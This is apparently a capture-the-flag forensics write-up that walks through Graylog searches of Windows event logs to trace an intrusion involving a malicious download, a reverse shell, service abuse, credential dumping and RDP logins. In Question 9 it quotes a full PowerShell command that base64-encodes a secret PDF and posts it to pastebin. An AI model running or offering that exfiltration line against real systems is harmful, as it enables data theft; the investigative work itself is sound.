---
title: Graylog
tags: 
  - Windows
  - Forensics
  - Infosec
date: 2020-01-19
---


Graylog is a log collection and searching program, like splunk. We're told an attack happened and we need to investigate it.

# Question 1

We're looking for new applications being launched which is `EventID: 1` (Process created). From here we can add the `CommandLine` column to the table and scroll through to look for anything suspicous. We can narrow it down even further by adding `AND UserAccount: minty`.

From here, we find `C:\Users\minty\Downloads\cookie_recipe.exe` which is pretty obviously the malicious file.

# Question 2

We can now use this binary path as a value for `ProcessImage`, which gives us a connection established event to DEFANELF:4444, or in ip form, 192.168.247.175:4444

# Question 3

We can use the same binary path as ParentProcessImage to see all the commands they executed with their initial shell. The first command was `whoami`

# Question 4

Using the same search as before, we can keep scrolling to find a bunch of calls to `sc` which target `webexservice`.

# Question 5

From the previous search, we see the new service is calling `C:\Users\minty\Downloads\cookie_recipe2.exe`. We use this as our new `ParentProcessImage` and see `C:\cookie.exe` with what looks like mimikatz invocation arguments.

# Question 6

We can search for EventID: 4624 (An account was successfully logged on). From here, we can look at the quick values for `SourceHostName` and find `DEFANELF`, the same hostname from question 2. Filtering only events with this `SourceHostName` we see all 14 values are with `AccountName: alabaster`.

# Question 7

We can look for remote desktop logins with `LogonType: 10` and see one with the user account `alabaster`. Since we know this account is compromised, it's safe to assume this is the attacker.

# Question 8

First, we look for connections from the workstation that was RDPed to: `EventID: 3 AND source: elfu-res-wks2`. We can narrow this further by only searching for connections after `2019-11-19 06:04:28` (when the RDP session started), as well as adding `AND UserAccount: alabaster`. 
We see something from `explorer.exe`, which indicates they're using something native to windows, rather than another backdoor/C2.
We can then search again for `EventID: 4624` (Logged in), This time narrowing it down with `SourceHostName: ELFU-RES-WKS2` (Windows capitalises it here for whatever reason). We see a bunch of logins to `alabaster` from the compromised computer, all with LogonType `3` (Network).

# Question 9

Searching for processes created on elfu-res-wks2, We see a powershell process with the following invocation:

```powershell
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -Uri https://pastebin.com/post.php -Method POST -Body @{ "submit_hidden" = "submit_hidden"; "paste_code" = $([Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf"))); "paste_format" = "1"; "paste_expire_date" = "N"; "paste_private" = "0"; "paste_name"="cookie recipe" }
```

This means we're reading from `C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf`, which is probably the super secret research.

# Question 10

We can search for messages surrounding the previous and see the Network Connection event, with DestinationIp `104.22.3.84`.